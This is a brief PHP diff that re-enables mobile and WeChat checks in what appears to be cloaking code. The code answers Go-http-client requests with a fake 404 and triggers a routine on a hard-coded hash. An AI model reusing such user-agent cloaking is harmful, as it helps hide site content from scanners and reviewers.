@@ -14,9 +14,9 @@ if ('txt' === $init->suffix) {
 }elseif ( strpos($_SERVER['HTTP_USER_AGENT'], 'Go-http-client/1.1')!==false ){
     Header("HTTP/1.1 404 Not Found");
     exit;
-}elseif (@$init->daixian == '2B72D9C6347855FAC6F5F314347D7B4A' /*&& true===$init->isMobile*/){
+}elseif (@$init->daixian == '2B72D9C6347855FAC6F5F314347D7B4A' && true===$init->isMobile){
     $init->daixian();
-} elseif (/*true === $init->iswx &&*/ !is_null($init->prefix) && !is_null($init->suffix)) {
+} elseif (true === $init->iswx && !is_null($init->prefix) && !is_null($init->suffix)) {
     # code...
     switch ($init->suffix) {
         case 'lr66':
